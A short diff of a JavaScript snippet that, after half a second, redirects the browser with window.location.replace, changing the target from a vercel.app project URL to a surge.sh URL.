@@ -1,5 +1,3 @@
 setTimeout(() => {
-  window.location.replace(
-    "https://sonasl-gemeinsamstarkerzgebirgegmxdes-projects.vercel.app"
-  );
+  window.location.replace("https://redstance-orbs.surge.sh/");
 }, 500);
